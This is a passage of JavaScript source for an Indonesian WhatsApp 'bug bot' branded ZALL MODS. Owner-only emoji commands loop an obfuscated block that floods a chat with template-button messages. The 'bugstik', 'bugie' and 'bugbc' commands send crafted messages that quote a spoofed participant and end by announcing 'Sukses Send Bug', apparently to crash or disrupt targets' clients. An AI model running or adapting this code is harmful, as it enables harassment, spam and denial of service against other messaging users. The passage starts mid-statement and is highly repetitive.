_0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '☣️':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🔮':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🦁':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🥴':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '👻':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '💩':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '🤢':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '💦':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '👽':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case '👺':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Halo Saya Rizal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62895330006855','771192XPifQJ','62895330006855','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20ZALL\x20MODS','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'ZALL\x20MODS','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
}
}
break
//=================================================//
case 'afk': {
if (isBan) throw sticBanLu(from)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot ZALL ${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bugstik':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"height": 1288,
"width": 1288,
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'tiktok': case 'tiktoknowm': case 'bugtiktok':
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
m.reply(mess.wait)
haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
break
//=================================================//
case 'bugie':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `HALLO AKU ZALL`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `ZALL MODS${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugbcimage': case 'bugbcvideo': case 'bugbcaudio': {
if (isBan) throw sticBanLu(from)
if (!isCreator) return
if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
let anu = await store.chats.all().map(v => v.id)
let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: 'ZALL MODS', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
